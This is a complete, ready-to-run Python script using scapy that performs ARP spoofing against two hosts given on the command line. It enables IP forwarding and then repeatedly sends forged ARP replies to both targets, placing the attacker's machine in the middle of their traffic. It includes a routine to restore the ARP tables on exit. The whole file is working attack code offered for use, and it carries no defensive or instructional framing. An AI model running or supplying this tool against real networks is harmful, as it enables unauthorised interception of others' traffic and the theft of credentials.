#!/usr/bin/python3

try:
    print("[>] Importing required modules")
    import scapy.all as scapy
    import time
    from subprocess import call
    import argparse
    import re
except ModuleNotFoundError:
    print("[!] Missing modules, Exiting...")
    exit()
else:
    print("[>] Modules successfully imported")
    print() # Just a line break

########################################################################
# User Defined Functions
########################################################################

def get_mac(ip):

    """This function will get the MAC address of the argument (IP) by ARP request"""

    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered = scapy.srp(arp_broadcast_packet,timeout=5,verbose=False)[0]
    try:
        return answered[0][1].hwsrc
    except IndexError:
        return '88:88:88:88:88:88'

def spoof(ip_1,spoof_ip):

    """This function will create ARP response packet for the target MAC
       telling that my MAC is on the spoof IP"""

    target_mac = get_mac(ip_1) # Getting the target MAC to send him the modified response
    arp_spoof_response = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=ip_1) # Crafting the packet
    scapy.send(arp_spoof_response,verbose=False) # Sending the modified ARP response

def restore(ip_1,spoofed_ip):

    """This function will restore the ARP tables by sending the target
       the actual MAC of the spoofed IP"""

    target_mac = get_mac(ip_1) # Again getting the target MAC to send him the response
    real_mac_of_spoofed_ip = get_mac(spoofed_ip) # Getting the real MAC of spoofed IP
    arp_honest_response = scapy.ARP(op=2,psrc=spoofed_ip, pdst=ip_1, hwsrc=real_mac_of_spoofed_ip, hwdst=target_mac)
    scapy.send(arp_honest_response,verbose=False,count=4) # Sending the honest response

def get_arguments():

    """This function will get arguments from the command line"""

    parser = argparse.ArgumentParser(description="ARP spoofer")
    parser.add_argument("-t","--targets",dest='target',help="2 targets to perform the spoof",nargs=2)
    parser.add_argument("-m","--mute",dest="mute",help="Show less information",action="store_true")
    options = parser.parse_args()
    
    return options.target, options.mute

def ip_is_valid(ip):
    
    """This function will check whether IP is valid or not
       It will just try to match a common IP regex pattern with IP"""

    list_of_matches = re.search("[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",ip)
    if list_of_matches:
        return True
    else:
        return False

def do_nothing():
    
    """Nothing ;)"""

    pass

########################################################################
# The main function
########################################################################

sent_packets_count = 0

# Processing the arguments
targets, mute = get_arguments()
try:
    ip_1 = targets[0]
    ip_2 = targets[1]
except:
    print("[X] Targets not passed by command-line arguments (properly), inputting manually")
    ip_1 = input("[?] Enter the IP 1 : ")
    ip_2 = input("[?] Enter the IP 2 : ")
    print() # Just a line break

# Checking either the IP's are valid or not
print("[+] Validating the IP's ") if not mute else do_nothing()
if ip_is_valid(ip_1) and ip_is_valid(ip_2):
    print("[+] IP's are valid, Proceeding") if not mute else do_nothing()
else:
    print("[!] IP's are not valid, Exiting...")
    exit()

# Enabling IP forwarding because we don't want to block the responses
print() if not mute else do_nothing() # Just a line break
print("[+] Enabling IP Forwarding") if not mute else do_nothing()
call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)

# Starting the spoof
print("[+] Starting the spoof") if not mute else do_nothing()
print() if not mute else do_nothing() # Just a line break
while True:
    try:
        spoof(ip_1,ip_2)
        spoof(ip_2,ip_1)
        sent_packets_count += 1
        print(f"\r[+] {sent_packets_count} spoof packet pair sent to both IP's",end='')
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[+] Restoring ARP tables...")
        restore(ip_1,ip_2)
        restore(ip_2,ip_1)
        print("[+] Exiting...")
        exit()
    except:
        print("\n[X] Something went wrong :(")
        exit()
